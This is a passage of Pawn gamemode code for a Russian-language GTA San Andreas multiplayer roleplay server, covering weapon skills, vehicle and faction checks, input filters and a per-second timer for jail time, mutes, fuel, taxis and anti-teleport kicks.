					g_player_skills[playerid][S_GUN][3]++, Shot[playerid][3] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'MP5' повышен.");
				}
				else if(Shot[playerid][3] >= AMMO_MP5_VIP && g_player_skills[playerid][S_GUN][3] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][3]++, Shot[playerid][3] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'MP5' повышен.");
				}
			}
			case 30:
			{
				Shot[playerid][4]++;
				if(Shot[playerid][4] >= AMMO_AK47 && g_player_skills[playerid][S_GUN][4] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][4]++, Shot[playerid][4] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'AK47' повышен.");
				}
				else if(Shot[playerid][4] >= AMMO_AK47_VIP && g_player_skills[playerid][S_GUN][4] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][4]++, Shot[playerid][4] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'AK47' повышен.");
				}
			}
			case 31:
			{
				Shot[playerid][5]++;
				if(Shot[playerid][5] >= AMMO_M4A1 && g_player_skills[playerid][S_GUN][5] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][5]++, Shot[playerid][5] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'M4A1' повышен.");
				}
				else if(Shot[playerid][5] >= AMMO_M4A1_VIP && g_player_skills[playerid][S_GUN][5] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][5]++, Shot[playerid][5] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'M4A1' повышен.");
				}
			}
		}
	}
	SetPlayerSkills(playerid);
	return 1;
}

stock IsABike(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
	    case 581,522,521,523,586,448,461,463,468,471: return 1;
	    default: return 0;
	}
	return 0;
}

stock SendMess(playerid, E_MSG_CMD_NAME:messageid)
{
	if(!IsPlayerConnected(playerid))
		return false;

	for(new id = sizeof(MSG_CMD_STRUCT)-1; id != -1; --id)
	{
		if(MSG_CMD_STRUCT[id][msgID] != messageid)
			continue;
		SendClientMessage(playerid, MSG_CMD_STRUCT[id][msgColor], MSG_CMD_STRUCT[id][msgText]);
		break;
	}
	return true;
}

stock iswheelmodel(modelid) {

	new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};
	for(new i = 0; i < 17; i++)
	{
		if(modelid == wheelmodels[i])
		return 1;
	}
	return 0;
}

stock IllegalCarNitroIde(carmodel) {

	new illegalvehs[29] = {581,523,462,521,463,522,461,448,468,586,509,481,510,472,473,493,595,484,430,453,452,446,454,590,569,537,538,570,449};
	for(new i = 0; i < 29; i++)
	{
		if(carmodel == illegalvehs[i])
		return 1;
	}
	return 0;
}

stock illegal_nos_vehicle(playerid)
{
	new carid = GetPlayerVehicleID(playerid);
	new playercarmodel = GetVehicleModel(carid);
	return IllegalCarNitroIde(playercarmodel);
}

stock islegalcarmod(vehicleide, componentid)
{
	new modok = false;
	if((iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
		new nosblocker = IllegalCarNitroIde(vehicleide);
		if(!nosblocker) modok = true;
	}
	else
	{
		for(new i = 0; i < 48; i++)
		{
			if(legalmods[i][0] == vehicleide)
			{
				for(new j = 1; j < 22; j++)
				{
					if(legalmods[i][j] == componentid) modok = true;
				}
			}
		}
	}
	return modok;
}

stock GetPlayerID(name[], playerid=INVALID_PLAYER_ID)
{
	/*foreach(new i: Player)
	{
		if(strcmp(GetName(i), name, true, strlen(name)) == 0) return i;
	}
	return INVALID_PLAYER_ID;*/

	sscanf(name, "u", playerid);

	return playerid;
}

stock IsAPlane(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 592,577,511,512,593,520,553,476,519,460,513,548,417,487,488,497,563,447,469: return 1;
		default: return 0;
	}
	return 0;
}

stock IsAVel(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 481,509,510: return 1;// 514 камаз
		default: return 0;
	}
	return 0;
}

stock IsAMoped(vehicleid) return (GetVehicleModel(vehicleid) == 462) ? (1) : (0);

stock IsABoat(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 472,473,493,595,484,430,452..454,446: return 1;
		default: return 0;
	}
	return 0;
}

stock IsLoginInvalid(text[])
{
	if(!strcmp(text, "maxeitzen", true)) return 0;

	if(strfind(text, "none", false) != -1) return 1;
	if(strfind(text, "'", true) != -1) return 1;
	if(strfind(text, "/", true) != -1) return 1;
	if(strfind(text, "%", true) != -1) return 1;
	if(strfind(text, "&", true) != -1) return 1;
	if(strfind(text, "*", true) != -1) return 1;
	if(strfind(text, "(", true) != -1) return 1;
	if(strfind(text, ")", true) != -1) return 1;
	if(strfind(text, "1", true) != -1) return 1;
	if(strfind(text, "2", true) != -1) return 1;
	if(strfind(text, "3", true) != -1) return 1;
	if(strfind(text, "4", true) != -1) return 1;
	if(strfind(text, "5", true) != -1) return 1;
	if(strfind(text, "6", true) != -1) return 1;
	if(strfind(text, "7", true) != -1) return 1;
	if(strfind(text, "8", true) != -1) return 1;
	if(strfind(text, "9", true) != -1) return 1;
	return 0;
}

stock IsTextInvalid(text[])
{
	if(strfind(text, "'", true) != -1) return 1;
	if(strfind(text, "%", true) != -1) return 1;
	if(strfind(text, "&", true) != -1) return 1;
	if(strfind(text, "*", true) != -1) return 1;
	if(strfind(text, "(", true) != -1) return 1;
	if(strfind(text, ")", true) != -1) return 1;
	return 0;
}

stock IsTextRussian(text[])
{
	if(strfind(text, "а", true) != -1) return 1;
	if(strfind(text, "б", true) != -1) return 1;
	if(strfind(text, "в", true) != -1) return 1;
	if(strfind(text, "г", true) != -1) return 1;
	if(strfind(text, "д", true) != -1) return 1;
	if(strfind(text, "е", true) != -1) return 1;
	if(strfind(text, "ё", true) != -1) return 1;
	if(strfind(text, "ж", true) != -1) return 1;
	if(strfind(text, "з", true) != -1) return 1;
	if(strfind(text, "и", true) != -1) return 1;
	if(strfind(text, "й", true) != -1) return 1;
	if(strfind(text, "к", true) != -1) return 1;
	if(strfind(text, "л", true) != -1) return 1;
	if(strfind(text, "м", true) != -1) return 1;
	if(strfind(text, "н", true) != -1) return 1;
	if(strfind(text, "о", true) != -1) return 1;
	if(strfind(text, "п", true) != -1) return 1;
	if(strfind(text, "р", true) != -1) return 1;
	if(strfind(text, "с", true) != -1) return 1;
	if(strfind(text, "т", true) != -1) return 1;
	if(strfind(text, "у", true) != -1) return 1;
	if(strfind(text, "ф", true) != -1) return 1;
	if(strfind(text, "х", true) != -1) return 1;
	if(strfind(text, "ц", true) != -1) return 1;
	if(strfind(text, "ч", true) != -1) return 1;
	if(strfind(text, "ш", true) != -1) return 1;
	if(strfind(text, "щ", true) != -1) return 1;
	if(strfind(text, "ъ", true) != -1) return 1;
	if(strfind(text, "ы", true) != -1) return 1;
	if(strfind(text, "ь", true) != -1) return 1;
	if(strfind(text, "э", true) != -1) return 1;
	if(strfind(text, "ю", true) != -1) return 1;
	if(strfind(text, "я", true) != -1) return 1;
	return 0;
}

stock GetVehicleType(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
	    case 483,534,535,536,558,559,560,561,562,565,567,575,576: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsACop(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT,TEAM_FBI: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsADps(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_POLICIA,TEAM_POLICIA2: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsAArmy(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_ARMIYA: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsAGang(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_GROOVE,TEAM_BALLAS,TEAM_RIFA,TEAM_OPGTEST2,TEAM_VAGOS: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsAMafia(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_OPG1,TEAM_RSM: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsANews(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsAMedic(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsAMayor(playerid)
{
	switch(GetTeamID(playerid))
	{
	    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO: return 1;
	    default: return 0;
	}
	return 0;
}

stock SetPlayerCriminal(playerid, killerid[], reason[])
{
	PI[playerid][pCrimes]++;
	MysqlUpdatePlayerInt(playerid, "crimes", PI[playerid][pCrimes]);
	strmid(PI[playerid][pWantedWho], killerid, 0, strlen(killerid), MAX_PLAYER_NAME);
	strmid(PI[playerid][pWantedReason], reason, 0, strlen(reason), 32);
	SendMes(playerid, COLOR_RED, "Вы совершили преступление: %s. Сообщает: %s.", reason, killerid);
	SendMes(playerid, COLOR_RED, "Ваш уровень розыска: %i", PI[playerid][pWanted]);
	MysqlUpdatePlayerStr(playerid, "wantedwho", PI[playerid][pWantedWho]);
	MysqlUpdatePlayerStr(playerid, "wantedreason", PI[playerid][pWantedReason]);
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(IsACop(i)) SendMes(i, 0x3399FFFF, "[SU] %s[%i] совершил преступление: %s. Звезд: %i. Сообщает: %s", GetName(playerid), playerid, reason, PI[playerid][pWanted], killerid);
	}
	PI[playerid][pZakon]--;
	MysqlUpdatePlayerInt(playerid, "zakon", PI[playerid][pZakon]);
	return 1;
}

stock NotFlyingHack(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid,20.0,1968.3948,-1198.0753,17.4500)||IsPlayerInRangeOfPoint(playerid,20.0,2310.9861,-1412.8881,21.6151)||
	IsPlayerInRangeOfPoint(playerid,20.0,1241.1094,-2379.7263,8.3145)||IsPlayerInRangeOfPoint(playerid,20.0,225.6394,-1187.0551,73.4500)||
	IsPlayerInRangeOfPoint(playerid,20.0,193.2040,-1224.7693,76.5034)||IsPlayerInRangeOfPoint(playerid,20.0,196.0067,-1232.3684,76.5034)||
    IsPlayerInRangeOfPoint(playerid,20.0,512.7349,-1104.1942,78.8238)||IsPlayerInRangeOfPoint(playerid,20.0,1283.7939,-806.5845,86.1230)||
	IsPlayerInRangeOfPoint(playerid,20.0,2531.6001,1568.4032,8.4171)||IsPlayerInRangeOfPoint(playerid,60.0,2105.2651,1916.6781,9.5989)||
	IsPlayerInRangeOfPoint(playerid,150.0,-792.4582,2173.0356,40.0821)||IsPlayerInRangeOfPoint(playerid,150.0,1993.5868,1601.2623,9.2979))return 1;
    return 0;
}

stock NoParking(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid,70.0,136.5189,801.1287,13.3578)||IsPlayerInRangeOfPoint(playerid,50.0,1356.9348,-163.2806,4.1900)||
	IsPlayerInRangeOfPoint(playerid,80.0,-317.1485,682.3771,12.2198)||IsPlayerInRangeOfPoint(playerid,20.0,653.4507,420.1294,12.0000))return 1;
	return 0;
}

stock PosRozetka(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid,1.0,-927.3851,851.7565,2512.9500)||
	IsPlayerInRangeOfPoint(playerid,1.0,905.0798,2099.1077,2721.8101)||
	IsPlayerInRangeOfPoint(playerid,1.0,2312.7952,-1922.0831,2023.2722))return 1;
	return 0;
}

stock PlayerSpeed(playerid)
{
    new Float:X, Float:Y, Float:Z;
    if(!IsPlayerInAnyVehicle(playerid)) GetPlayerVelocity(playerid,X,Y,Z);
    return floatround( floatsqroot( X * X + Y * Y + Z * Z ) * 170.0 );
}

stock GetPlayerSpeed(playerid)
{
    new Float:Coord[4];
    if(IsPlayerInAnyVehicle(playerid)) return 0;
	GetPlayerVelocity(playerid,Coord[0], Coord[1], Coord[2]);
    Coord[3] = floatsqroot(floatpower(floatabs(Coord[0]), 2.0) + floatpower(floatabs(Coord[1]), 2.0) + floatpower(floatabs(Coord[2]), 2.0)) * 213.3;
    return floatround(Coord[3]);
}

stock GetVehicleSpeed(vehicleid)
{
    new Float:ST[3];
    GetVehicleVelocity(vehicleid, ST[0], ST[1], ST[2]);
    return floatround(floatsqroot(ST[0]*ST[0] + ST[1]*ST[1] + ST[2]*ST[2])*100);
}

stock GetSquareDistance(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2)
{
	x1-=x2;
	y1-=y2;
	z1-=z2;
	x1*=x1;
	y1*=y1;
	z1*=z1;
	return floatround(x1+y1+z1);
}

forward @200mc_Timer(playerid);
public @200mc_Timer(playerid)
{
	if(PlayerLogged[playerid])
	{
		if(IsPlayerDriver(playerid))
		{
			new keys, gas_brake, left_right;

			GetPlayerKeys(playerid, keys, gas_brake, left_right);

			new pedal_type = PEDAL_TYPE_NONE;

			if((keys & KEY_SPRINT) && !(keys & KEY_JUMP || keys & KEY_HANDBRAKE))
				pedal_type = PEDAL_TYPE_GAS;

			else if(keys & KEY_JUMP && !(keys & KEY_SPRINT || keys & KEY_HANDBRAKE))
				pedal_type = PEDAL_TYPE_BRAKE;

			PI[playerid][P_PEDAL] = pedal_type;
		}

		if(!IsACop(playerid) || !IsAArmy(playerid) || !IsAMayor(playerid) || !PI[playerid][pAdmin])
		{
			for(new i; i < sizeof(AreaInfo[arGreenZone]); i++)
			{
				if(IsPlayerInDynamicArea(playerid, AreaInfo[arGreenZone][i]))
				{
					if(GetPlayerWeapon(playerid) > 0)
					{
						ApplyAnimation(playerid,"PED","handscower",4.1,1,0,0,0,1000);
						SetPlayerArmedWeapon(playerid, 0);
						return 0;
					}
				}
			}
		}
	}

	return 1;
}

forward @1000mc_Timer(i, playerid);
public @1000mc_Timer(i, playerid)
{
    //Player_Control(i);


    if(PlayerLogged[i] == false)
	{
		SetPVarInt(i, "avttimer", GetPVarInt(i, "avttimer") - 1);
		if(GetPVarInt(i, "avttimer") == 0)
		{
			SendMess(i, MSG_LOGGED_TIME_OVER);
			SKick(i, 21122);
			return 1;
		}
	}

	if(PlayerLogged[i] == true)
	{
		if(PI[i][pAFK] <= 3)
		{
			if(PI[i][P_AREND_SCOOTER] != INVALID_VEHICLE_ID)
			{
				new vehicleid = PI[i][P_AREND_SCOOTER];

				if(IsValidVehicle(vehicleid) && !IsPlayerInVehicle(i, vehicleid))
				{
					new Float:x, Float:y, Float:z;
					GetVehiclePos(vehicleid, x, y, z);
					if(!IsPlayerInRangeOfPoint(i, 500.0, x, y, z) && GetPlayerVirtualWorld(i) == 0 && GetPlayerInterior(i) == 0)
					{
						SendClientMessage(i, C_RED, "Аренда арендованного Вами транспорта была аннулирована.");
						DestroyVehicle(PI[i][P_AREND_SCOOTER]);
						PI[i][P_AREND_SCOOTER] = INVALID_VEHICLE_ID;
					}
				}
			}
			if(GetPVarInt(i,"LessProgress") >= 100 && !GetPVarInt(i,"LessStatus"))
			{
				TogglePlayerControllable(i, 0);
				DerevoTimer[i] = SetTimerEx("GatDerevo", 2000, false, "i", i);
			}
			if(MUSICACTIVE == true && activemusic[i] == false && IsPlayerInRangeOfPoint(i, MUSICDIST, MUSICX, MUSICY, MUSICZ))
			{
				if(PlayerMusic[i] == true)
				{
				   PlayAudioStreamForPlayer(i, MUSICURL, MUSICX, MUSICY, MUSICZ,MUSICDIST, 1);
				   activemusic[i] = true;
				   SendClientMessage(i, C_BLUE, "Вы попали в зону проигрывания музыки.");
				   SendClientMessage(i, C_BLUE, "Во избежании недоразумений, сделайте пожалуйста громкость колонок тише.");
				   SendClientMessage(i, C_BLUE, "В песне, возможно, будет использована нецензурная брань.");
				}
			}
			if(MUSICACTIVE == true && activemusic[i] == true && !IsPlayerInRangeOfPoint(i, MUSICDIST, MUSICX, MUSICY, MUSICZ))
			{
				if(PlayerMusic[i] == true)
				{
				   activemusic[i] = false;
				   StopAudioStreamForPlayer(i);
				   SendClientMessage(i, C_BLUE, "Вы покинули зону прослушивания музыки!");
				}
			}
			for(new idx; idx < sizeof(prohibited_weapons); idx++)
			{
				if(GetPlayerWeapon(i) == prohibited_weapons[idx])
				{
					SendClientMessage(i,COLOR_RED,"Это оружие входит в список запрещенных на сервере");
				   // ResetPlayerWeapons(idx);
					RemovePlayerWeapon(i, GetPlayerWeapon(idx));
					return 1;
				}
			}

			if(PI[i][pJail])
			{
				PI[i][pJailTime]--;

				MysqlUpdatePlayerInt(i, "jailtime", PI[i][pJailTime]);
				MysqlUpdatePlayerInt(i, "jail", PI[i][pJail]);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET jailtime=%d WHERE id=%d", PI[i][pJailTime], PI[i][pID]);
				mysql_query(dbHandle, STRING_GLOBAL);

				if(PI[i][pJailTime] <= 0)
				{
					if(PI[i][pJail] == 1)
					{
						SendClientMessage(i, COLOR_WHITE,"Время заключения в тюрьме истекло, теперь Вы свободны");
						SetPlayerPos(i, -1703.7883,-2805.5542,14.0763);
						SetPlayerFacingAngle(i, 0);
						//SpawnPlayer(i);
					}
					if(PI[i][pJail] == 2)
					{
						SendClientMessage(i, COLOR_WHITE,"Время заключения в тюрьме истекло, теперь Вы свободны");
						//SetPlayerPos(i, -1703.7883,-2805.5542,14.0763);
						//SetPlayerFacingAngle(i, 330);
						SpawnPlayer(i);
					}
					if(PI[i][pJail] == 3)
					{
						SendClientMessage(i, COLOR_WHITE,"Время заключения в тюрьме истекло, теперь Вы свободны");
						//SetPlayerPos(i, -1703.7883,-2805.5542,14.0763);
						//SetPlayerFacingAngle(i, 330); //убрать
						SpawnPlayer(i);
					}
					if(PI[i][pJail] == 4)
					{
						SendClientMessage(i, COLOR_WHITE,"Время заключения в деморгане истекло, теперь Вы свободны");
						SpawnPlayer(i);
					}
					SetPlayerColorEx(i, TeamColors[GetTeamID(i)]);
					GameTextForPlayer(i, "~g~freedom", 5000, 1);
					PI[i][pJail] = PI[i][pJailTime] = 0;
					MysqlUpdatePlayerInt(i, "jail", PI[i][pJail]);
					MysqlUpdatePlayerInt(i, "jailtime", PI[i][pJailTime]);
					SetPlayerInterior(i, 0);
					SetPlayerVirtualWorld(i, 0);
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET jailtime=0, jail=0 WHERE id=%d", PI[i][pID]);
					mysql_query(dbHandle, STRING_GLOBAL);
				}
			}
			if(PI[i][P_ORDER_ID] != -1)
			{
				if(gettime() > PI[i][P_ORDER_TIME])
				{
					SendClientMessage(i, C_OSNOV, "Вы не успели доставить заказ, он будет передан другому игроку");
					DisablePlayerRaceCheckpoint(i);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE orders SET status=0 WHERE id=%d", PI[i][P_ORDER_ID]);
					mysql_query(dbHandle, STRING_GLOBAL);

					PI[i][P_ORDER_BIZ_ID]					=
					PI[i][P_ORDER_TIME]						=
					PI[i][P_ORDER_ID]						= -1;

					DisablePlayerCheckpoint(i);
				}
			}
			if(PI[i][P_GNEWS] == 5 && PI[i][P_GNEWS_TIME] != -1)
			{
				if(gettime() > PI[i][P_GNEWS_TIME])
				{
					PI[i][P_GNEWS_TIME] = -1;
					PI[i][P_GNEWS] = 0;

					SendClientMessage(i, C_BLUE, "Время вышло, теперь Вы можете писать в /gnews");
				}
			}
			if(PI[i][pMuted] > 0)
			{
				PI[i][pMuted] -= 1;
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET mute=%d WHERE name='%s'", PI[i][pMuted], GetName(i));
				mysql_query(dbHandle, STRING_GLOBAL);

				if(PI[i][pMuted] <= 0)
				{
					SendClientMessage(i, COLOR_GREEN, "Время мута закончилось, теперь Вы можете говорить");
					SendClientMessage(i, COLOR_WHITE, "Соблюдайте правила сервера, чтобы избежать наказаний!");
					/*PI[i][pMuted] = 0;
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET mute=0 WHERE id=%d", PI[i][pID]);
					mysql_query(dbHandle, STRING_GLOBAL);*/
				}
			}

			//if(PI[i][pCash] > 1000000000) PI[i][pCash] = 1000000000, MysqlUpdatePlayerInt(i, "cash", PI[i][pCash]);
			//if(PI[i][pBank] > 1000000000) PI[i][pBank] = 1000000000, MysqlUpdatePlayerInt(i, "bank", PI[i][pBank]);

			if(CheckOutMoney[i] == false)
			{
				if(PI[i][pCash] < GetPlayerMoney(i))
				{
					ResetPlayerMoney(i);
					GivePlayerMoney(i,PI[i][pCash]);
				}
			}
			else CheckOutMoney[i] = false;
			if(admin_ban_time[i] > 0) admin_ban_time[i] --;
			MysqlUpdatePlayerInt(i, "ban_time", admin_ban_time[i]);
			if(GetPVarInt(i, "CHECKTIME") && admin_check_time[i] == gettime()) DeletePVar(i, "CHECKTIME"), admin_attempt[i] = 0;

			new Float: FloatParam;
			if(PlayerUseHeal[i] == 0)
			{
				GetPlayerHealth(i, FloatParam);
				if(PI[i][pHeal] < FloatParam) SetPlayerHealth(i, PI[i][pHeal]);
				else PI[i][pHeal] = FloatParam;
			}
			HospitalHealth(i);

			player_hour_time[i] ++ ;
			if(player_hour_time[i] >= 60*60*3) // 3 часа
			{
				player_hour_time[i] = 0;
				SendClientMessage(i, 0x4BC53DFF, "Вы отыграли на сервере 3 часа и получили за это: {EB9419}10000 игровой валюты!");
				SendClientMessage(i, 0x4BC53DFF, "Для получения нового подарка, отыграйте на сервере еще 3 часа!");
				GiveMoney(i, 10000);
				player_hour_time[i] = 0;
			}

			if(Phonesmenu[i] == 1)
			{
				new h, m, s, day, month, year;
				gettime(h, m, s);
				getdate(year, month, day);
				SetWorldTime(h);
				new str[300];
				format(str, sizeof(str),"%02d.%02d.%d - %02d:%02d", day, month, year, h, m);
				PlayerTextDrawSetString(i,PhonesSA[i][0],str);
			}

			if(PI[i][Spectating][1] != INVALID_PLAYER_ID)
			{
				new str[300];
				new Float:values[3];
				GetPlayerHealth(PI[i][Spectating][0], values[0]);
				//GetPlayerArmour(PI[i][Spectating][0], values[1]);
				GetVehicleHealth(GetPlayerVehicleID(PI[i][Spectating][0]), values[2]);
				format(str, sizeof(str), "%s~n~ID: %d~n~Ping: %d~n~HP: %.1f~n~Armour: %.1f~n~Speed: %d~n~CarHP: %.1f~n~Ammo: %i:%i~n~Warns: %d~n~Cash: %d",
				GetName(PI[i][Spectating][0]), PI[i][Spectating][0], GetPlayerPing(PI[i][Spectating][0]),
				values[0], values[1], SpeedVehicle(PI[i][Spectating][0]) / 2, values[2],
				GetPlayerWeapon(PI[i][Spectating][0]), GetPlayerAmmo(PI[i][Spectating][0]),
				PI[PI[i][Spectating][0]][pWarn], PI[PI[i][Spectating][0]][pCash]);
				PlayerTextDrawSetString(PI[i][Spectating][1], PI[PI[i][Spectating][1]][SpecTxt], str);
			}

			if(Settings[i][3] == 0)
			{
				if(GetMoney(i) >= 5000000)
				{
					if(!GetPVarInt(i, "keis"))
					{
						SetPlayerAttachedObject(i,8,1210,5,0.299999,0.099999,0.000000,0.000000,-83.000000,0.000000,1.000000,1.000000,1.000000);
						SetPVarInt(i, "keis", true);
					}
					if(GetPVarInt(i, "keis"))
					{
						if(GetPlayerWeapon(i) > 0 || GetPlayerState(i) != PLAYER_STATE_ONFOOT)
						{
							if(IsPlayerAttachedObjectSlotUsed(i, 8))
								RemovePlayerAttachedObject(i, 8);
						}
						else
						{
							if(!IsPlayerAttachedObjectSlotUsed(i, 8))
								SetPlayerAttachedObject(i,8,1210,5,0.299999,0.099999,0.000000,0.000000,-83.000000,0.000000,1.000000,1.000000,1.000000);
						}
					}
				}
				else if(GetMoney(i) < 1000000)
				{
					if(IsPlayerAttachedObjectSlotUsed(i, 8))
					{
						if(GetPVarInt(i, "keis"))
						{
							RemovePlayerAttachedObject(i, 8);
							DeletePVar(i, "keis");
						}
					}
				}
			}
		}

		if(AcStruct[i][CheckMapTP] == 1)
		{
			new Float:dis = GetPlayerDistanceFromPoint(i, AcStruct[i][MapTP][0], AcStruct[i][MapTP][1], AcStruct[i][MapTP][2]);
			if(dis < 5.0)
			{
				new Float:disd = GetPlayerDistanceFromPoint(i, AcStruct[i][LastOnFootPosition][0], AcStruct[i][LastOnFootPosition][1], AcStruct[i][LastOnFootPosition][2]);
				if(disd > 25.0) SKick(i, 1942);
			}
			AcStruct[i][CheckMapTP] = 0;
		}
		GetPlayerPos(i, AcStruct[i][LastOnFootPosition][0], AcStruct[i][LastOnFootPosition][1], AcStruct[i][LastOnFootPosition][2]);

		if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(i);
			if(!IsAMoped(vehicleid) && !IsAVel(vehicleid) && !IsABoat(vehicleid) && !IsAPlane(vehicleid))
			{
				fuelcheck++;
				if(fuelcheck == 70)
				{
					fuelcheck = 0;
					if(GetVehicleData(vehicleid, veh_engine) == true && GetVehicleData(vehicleid, veh_fuel) > 0)
					{
						if(g_vehicle[vehicleid][veh_autosalon] == false)
							g_vehicle[vehicleid][veh_fuel] --;

						if(GetVehicleData(vehicleid, veh_fuel) < 1)
						{
							SetVehicleData(vehicleid, veh_engine, false);
							PlayerFuelMes[vehicleid] = true;
							GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(vehicleid,false,lights,alarm,doors,bonnet,boot,objective);
							SetVehicleData(vehicleid, veh_fuel, 0);
						}
					}
				}
			}
			if(GetVehicleData(vehicleid, veh_fuel) < 1 && PlayerFuelMes[vehicleid] == true && GetVehicleModel(vehicleid) != 462)
			{
				SendClientMessage(i, COLOR_GREY, "В транспорте закончился бензин, необходима заправка!");
				SetVehicleData(vehicleid, veh_engine, false);
				GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(vehicleid,false,lights,alarm,doors,bonnet,boot,objective);
				PlayerFuelMes[vehicleid] = false;
			}
		}
		PI[i][pCheckTime]++;
		MysqlUpdatePlayerInt(i, "checktime", PI[i][pCheckTime]);
		if(PI[i][pAdmin]) AdminInfo[i][admTimeMin]++;
		if(Ether[i] == true) SetPVarInt(i, "InEther", GetPVarInt(i, "InEther") + 1);
		if(GetPVarInt(i, "TypeBus")) PI[i][pBusTime]++;

		if(IsPlayerInRangeOfPoint(i,1.0,1697.2358,1349.7236,12.1700))
		{
			if(IsAArmy(i) || IsAGang(i))
			{
				StealMats(i);
			}
		}
		if(Mobile[i] != -1 && EtherCalled[i] == false)
		{
			SetPVarInt(i, "CallTime", GetPVarInt(i, "CallTime") + 1);
			if(GetPVarInt(i, "CallTime") >= 10)
			{
				if(PI[i][pBank] > PHONE_PRICE)
				{
					PI[i][pBank] -= PHONE_PRICE;
					SetPVarInt(i, "CallTime", 0);
					MysqlUpdatePlayerInt(i, "bank", PI[i][pBank]);
				}
				else
				{
					new callerid = Mobile[i];
					SendClientMessage(callerid, COLOR_GRAD2, "Абонент положил трубку");
					SetPlayerSpecialAction(callerid,SPECIAL_ACTION_STOPUSECELLPHONE);
					CellTime[callerid] = -1;
					CellTime[i] = -1;
					SendClientMessage(i,  COLOR_GRAD2, "Недостаточно средств на счету...");
					Mobile[i] = -1;
					SetPlayerSpecialAction(i,SPECIAL_ACTION_STOPUSECELLPHONE);
					DeletePVar(i, "CallTime");
					DeletePVar(callerid, "CallTime");
				}
			}
		}
		if(GetPVarInt(i, "TimeTaxi") > 0)
		{
			new vehicleid = GetPlayerVehicleID(i);

			if(GetVehicleData(vehicleid, veh_driver_id) != INVALID_PLAYER_ID)
				return 1;


			SetPVarInt(i, "TimeTaxi", GetPVarInt(i, "TimeTaxi") - 1);
			if(GetPVarInt(i, "TimeTaxi") == 0)
			{
				if(GetMoney(i) > GetPVarInt(i, "TaxiPrice"))
				{
					new string[32];
					format(string, sizeof(string), "~r~-%iр", GetPVarInt(i, "TaxiPrice"));
					GameTextForPlayer(i, string, 5000, 1);
					format(string, sizeof(string), "~b~+%iр", GetPVarInt(i, "TaxiPrice"));
					GameTextForPlayer(GetPVarInt(i, "PlayerTaxi"), string, 5000, 1);
					GiveMoney(i, -GetPVarInt(i, "TaxiPrice"));
					PI[GetPVarInt(i, "PlayerTaxi")][pPayCheck] += GetPVarInt(i, "TaxiPrice");
					MysqlUpdatePlayerInt(GetPVarInt(i, "PlayerTaxi"), "paycheck", PI[GetPVarInt(i, "PlayerTaxi")][pPayCheck]);
					SetPVarInt(i, "TimeTaxi", 30);
					SetPVarInt(GetPVarInt(i, "PlayerTaxi"), "TaxiMoney", GetPVarInt(GetPVarInt(i, "PlayerTaxi"), "TaxiMoney") + GetPVarInt(i, "TaxiPrice"));
				}
				else
				{
					SendClientMessage(i, COLOR_GREY, "У Вас не хватает денег!");
					RemovePlayerFromVehicle(i);
				}
			}
		}
		if(GetPVarInt(i, "TimeBus") > 0)
		{
			SetPVarInt(i, "TimeBus", GetPVarInt(i, "TimeBus") - 1);
			new string[32];
			format(string, sizeof(string), "~r~%i", GetPVarInt(i, "TimeBus"));
			GameTextForPlayer(i, string, 2000, 6);
